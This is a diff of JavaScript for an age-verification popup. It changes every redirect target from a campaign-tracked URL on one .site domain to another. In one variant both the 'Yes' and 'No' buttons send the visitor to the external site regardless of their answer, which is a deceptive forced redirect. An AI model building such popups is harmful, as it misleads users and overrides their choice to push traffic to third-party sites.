@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]";
+  const REDIRECT = "https://orivexa.site/";
 
   function buildPopup() {
     // prevent double render
@@ -42,7 +42,7 @@ function close() {
     // Your custom behavior: Yes = just close, No = go to privacy
     bd.querySelector("#age-yes").addEventListener("click", close);
     bd.querySelector("#age-no").addEventListener("click", () => {
-      window.location.href = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]";
+      window.location.href = "https://orivexa.site/";
     });
   };
 
@@ -58,7 +58,7 @@ function close() {
 
     // Your custom behavior: both buttons redirect
     bd.querySelector("#age-yes").addEventListener("click", () => {
-      window.location.href = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]";
+      window.location.href = "https://orivexa.site/";
     });
     bd.querySelector("#age-no").addEventListener("click", () => {
       window.location.href = REDIRECT;
